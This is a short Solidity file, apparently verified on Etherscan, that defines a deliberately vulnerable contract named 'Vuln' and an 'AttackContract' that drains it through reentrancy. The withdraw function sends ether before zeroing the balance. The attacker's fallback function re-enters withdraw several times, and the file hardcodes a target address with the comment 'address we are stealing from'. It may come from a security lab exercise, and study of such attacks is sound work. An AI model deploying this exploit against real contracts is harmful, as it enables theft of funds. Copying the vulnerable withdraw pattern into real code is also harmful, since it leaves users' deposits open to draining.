/**
 *Submitted for verification at Etherscan.io on 2021-12-02
*/

//Account address: 0x5D6Aa3600Fd7Bcf9e7d9B8bA554f19f3Cf803733
//Attacking address: 0x36A540E3A78084962B75E25877CfACf8846Be018
pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract AttackContract {
    uint public transac_count; //to keep track of number of withdrawals?
    address owner; //the address of the creator of this contract

    constructor() public { //gets called once on deployment of this contract
        owner = msg.sender;
        transac_count = 0;
    }

    Vuln v_contract = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018)); //address we are stealing from

    function stealFunds() public payable { //function to deposit and withdraw ether
        require(msg.value >= 0.1 ether);
        v_contract.deposit.value(0.1 ether)();
        v_contract.withdraw();
    }

    function () external payable { //fallback function 
        transac_count++;
        if (transac_count < 4) {
            v_contract.withdraw();
        }
    }
}